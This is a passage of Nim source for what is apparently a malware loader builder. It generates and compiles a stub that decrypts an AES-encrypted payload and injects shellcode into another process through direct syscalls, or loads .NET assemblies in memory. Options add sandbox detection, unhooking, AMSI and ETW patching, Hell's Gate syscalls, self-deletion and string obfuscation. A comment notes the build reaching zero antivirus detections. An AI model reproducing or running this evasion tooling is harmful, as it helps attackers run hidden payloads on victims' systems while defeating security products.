    
    var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
    var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)


    var oldProtection: DWORD = 0

    # define NtOpenProcess
    var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP));
    VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtAllocateVirtualMemory
    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc));
    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite));
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtCreateThreadEx
    let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate));
    VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    var status: NTSTATUS
    var success: BOOL

    success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP));
    success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc));
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite));
    success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate));

    
    status = NtOpenProcess(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )


    status = NtAllocateVirtualMemory(
        pHandle, &ds, 0, &sc_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE);

    var bytesWritten: SIZE_T

    status = NtWriteVirtualMemory(
        pHandle, 
        ds, 
        unsafeAddr friendlycode, 
        sc_size-1, 
        addr bytesWritten);

    echo obf("[*] NtWriteVirtualMemory: "), status
    echo obf("    \\-- bytes written: "), bytesWritten
    echo obf("")

    status = NtCreateThreadEx(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        ds, 
        NULL, FALSE, 0, 0, 0, NULL);

    status = NtClose(tHandle)
    status = NtClose(pHandle)

    # This doesn't work so far for some reason
    #success = VirtualProtect(syscallStub_NtOpenP, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection);
    #echo obf("set back old protect")
    echo success
   

when isMainModule:
     injectCreateRemoteThread(dectext)

"""

let AssemblyImports = """
import winim/clr except `[]`
"""

let LoadAssemblyStub = """

var assembly = load(dectext)

var cmd: seq[string]
var i = 1
while i <= paramCount():
    cmd.add(paramStr(i))
    inc(i)

"""

let LoadAssemblyStubArgs = """
var arr = toCLRVariant(cmd, VT_BSTR)
assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
"""

let LoadAssemblyStubNoArgs = """

var arr = toCLRVariant([""], VT_BSTR) # Passing no arguments
assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))

"""

let WinLeanGetCurrentProcStub = """
from winlean import getCurrentProcess

"""

let Winimleanstub = """
import winim/lean
"""

let Cryptstub1 = """
import winim/lean
#from dynlib import LibHandle, loadLib
# something seams to be still missing here
#from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, CreateFileA, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, GetFileSize, HeapAlloc, GetProcessHeap, ReadFile, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, GetCurrentProcess, GetCurrentProcessId, OpenProcess, PROCESS_ALL_ACCESS, FALSE, VirtualAllocEx, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, VirtualProtect, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES, NtClose
import dynlib
import strformat
from os import sleep, paramCount, paramStr
from nimcrypto import CTR, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
import base64
import strutils
import ptr_math
import strenc

var success: BOOL

const encstring = slurp"enc.blob"

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

### Modified code from Nim-Strenc to avoid XORing of long strings -> Modified by @chvancooten, credit to him
### Original source: https://github.com/Yardanico/nim-strenc
import macros, hashes

type
    estring = distinct string

proc calcTheThings(s: estring, key: int): string {.noinline.} =
    var k = key
    result = string(s)
    for i in 0 ..< result.len:
        for f in [0, 8, 16, 24]:
            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xFF))
    k = k +% 1

var eCtr {.compileTime.} = hash(CompileTime & CompileDate) and 0x7FFFFFFF

macro obf*(s: untyped): untyped =
    if len($s) < 10000:
        var encodedStr = calcTheThings(estring($s), eCtr)
        result = quote do:
            calcTheThings(estring(`encodedStr`), `eCtr`)
        eCtr = (eCtr *% 16777619) and 0x7FFFFFFF
    else:
        result = s

# Decrypt.nim
func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

var dctx: CTR[aes256]
"""

let Cryptstub2 = fmt"""
var enctext: seq[byte] = toByteSeq(encstring)
var key: array[aes256.sizeKey, byte]
var envkey: string = decode("{encodedenvkey}")
var iv: array[aes256.sizeBlock, byte]
var pp: string = decode("{encodedIV}")
"""

let Cryptstub3 = fmt"""
# Decode and save IV
copyMem(addr iv[0], addr pp[0], len(pp))

# Ecnrypt Key
var expandedkey = sha256.digest(envkey)
copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

var dectext = newSeq[byte](len(enctext))

# Decrypt
dctx.init(key, iv)
dctx.decrypt(enctext, dectext)
dctx.clear()

"""


var stub = Cryptstub1

if (selfdelete):
    stub.add(FileDeleteStub)

if(sandbox):
    for m in sandboxchecks:
        if(m == "Domain"):
            stub.add(DomainCheckStub)
            stub.add(DomainCheckStub1)
        if (m == "DiskSpace"):
            stub.add(DiskSpaceStub)
        if (m == "DomainJoined"):
            stub.add(DomainJoinStub)
        if (m == "MemorySpace"):
            stub.add(MemorySpaceStub)

if(gosleep):
    stub.add(SleepStub)

if(unhook):
    stub.add(Winimleanstub)
    stub.add(UnhookStub)

# Only decrypt when sandbox Checks/nhooking/Sleep is done
stub = stub & Cryptstub2 & Cryptstub3

if (hellsgate):
    stub.add(WinLeanGetCurrentProcStub)
    stub.add(HellsgateStub)
    stub.add(HellsgateWriteDelegate)
    if (AMSI):
        stub = stub & HellsgateProtectDelegate &  HellsgateAMSIPatchStub
        if(ETW):
            if (COMVARETW):
                stub = stub & ETWCOMVARStub
            else:
                stub = stub & HellsgateETWPatchStub
    else:
        if(ETW):
            if (COMVARETW):
                stub = stub & ETWCOMVARStub
            else:
                stub = stub & HellsgateProtectDelegate & HellsgateETWPatchStub
    if(localinject):
        stub = stub & HellsgateAllocDelegate & HellsgateLocalInjectStub
    else:
        # ToDo - not ready yet
        stub.add(RemoteProcImportStub)
        if (processname == ""):
            stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_notepad & ShellcoderemoteinjectStub  
        else:
            stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_customproc & ShellcoderemoteinjectStub
if (shellcode):
    stub.add(GetSyscallStub)
    if (AMSI):
        stub = stub &  AMSIETWDelegates & AMSIStub
        if(ETW):
            if (COMVARETW):
                stub = stub & ETWCOMVARStub
            else:
                stub = stub & ETWPatchStub
    else:
        if(ETW):
            if (COMVARETW):
                stub = stub & ETWCOMVARStub
            else:
                stub = stub & AMSIETWDelegates & ETWPatchStub
    if(localinject):
        stub = stub & LocalInjectDelegates & ShellcodelocalStub
    else:
        stub.add(RemoteProcImportStub)
        if (processname == ""):
            stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_notepad & ShellcoderemoteinjectStub  
        else:
            stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_customproc & ShellcoderemoteinjectStub

if (csharp):
    stub.add(AssemblyImports)
    if (AMSI):
        stub.add(GetSyscallStub)
        stub.add(AMSIETWDelegates)
        stub.add(AMSIStub)
        if(ETW):
            if (COMVARETW):
                stub.add(ETWCOMVARStub)
            else:
                stub.add(ETWPatchStub)
    else:
        if(ETW):
            if (COMVARETW):
                stub.add(ETWCOMVARStub)
            else:
                stub.add(GetSyscallStub)
                stub.add(AMSIETWDelegates)
                stub.add(ETWPatchStub)
    echo "adding Stub:"
    if (noArgs):
        stub.add(LoadAssemblyStub)
        stub.add(LoadAssemblyStubNoArgs)
    else:
        stub.add(LoadAssemblyStub)
        stub.add(LoadAssemblyStubArgs)

writeFile("Loader.nim", stub)
echo "Written Loader.nim, compiling -> \n\n"
# --hint[Pattern]:off is used to not break nim-strenc - https://github.com/Yardanico/nim-strenc/issues/6
# This is only for the best size: -d:danger -d:strip --opt:size --passc=-flto --passl=-flto / But it also bypasses three more vendors on antiscan.me from 3 up to 0 detections :)
# --passc=-flto --passl=-flto are not compatible with Hellsgate as they break the functionality
if (hellsgate):
    echo "Replacing === with \"\"\" for ASM stubs before compiling:\n"
    discard exec_cmd_ex("nimgrep === --replace \\\"\\\"\\\" Loader.nim")
    if (denim):
        var exist: bool = existsFile("denim.exe")
        if (exist):
            discard os.execShellCmd(fmt".\denim.exe compile Loader.nim")
            let msg = fmt"[!] Encrypted file saved to Loader.exe"
            
    if (reflective):
        if (hide):
            discard os.execShellCmd(fmt"nim c -d:release --app=console --app:gui --dynamicbase,--export-all-symbols --hint:all:off --warning:all:off -d:danger -d:strip --opt:size --out={outfile} Loader.nim")
            
        else:
            discard os.execShellCmd(fmt"nim c -d:release --app=console --dynamicbase,--export-all-symbols --hint:all:off --warning:all:off -d:danger -d:strip --opt:size --out={outfile} Loader.nim")
            
    else:
        if(hide):
            discard os.execShellCmd(fmt"nim c -d:release --app:gui --hint:all:off --warning:all:off -d:danger -d:strip --opt:size --out={outfile} Loader.nim")
            
        else:
            discard os.execShellCmd(fmt"nim c -d:release --app:console --hint:all:off --warning:all:off -d:danger -d:strip --opt:size --out={outfile} Loader.nim")
                
elif (denim):
    var exist: bool = existsFile("denim.exe")
    if (exist):
        discard os.execShellCmd(fmt".\denim.exe compile Loader.nim")
        let msg = fmt"[!] Encrypted file saved to Loader.exe"
        
    else:
        echo fmt"'.\Denim.exe' not found. You need to download and install it from here: https://github.com/moloch--/denim"
        
elif (reflective):
    if (hide):
        discard os.execShellCmd(fmt"nim c -d:release --app=console --app:gui --dynamicbase,--export-all-symbols --hint:all:off --warning:all:off -d:danger -d:strip --opt:size --passc=-flto --passl=-flto --out={outfile} Loader.nim")
        
    else:
        discard os.execShellCmd(fmt"nim c -d:release --app=console --dynamicbase,--export-all-symbols --hint:all:off --warning:all:off -d:danger -d:strip --opt:size --passc=-flto --passl=-flto --out={outfile} Loader.nim")
        
else:
    if(hide):
        discard os.execShellCmd(fmt"nim c -d:release --app:gui --hint:all:off --warning:all:off -d:danger -d:strip --opt:size --passc=-flto --passl=-flto --out={outfile} Loader.nim")
        
    else:
        discard os.execShellCmd(fmt"nim c -d:release --app:console --hint:all:off --warning:all:off -d:danger -d:strip --opt:size --passc=-flto --passl=-flto --out={outfile} Loader.nim")

if(replace):
    var randstring: string = rndStr(2)
    echo fmt"[!] ---> replacing nim with {randstring} "
    discard exec_cmd_ex(fmt"nimgrep nim --replace {randstring} {outfile}")
let msg = fmt"[!] Encrypted file saved to {outfile}"
echo "\n" & msg
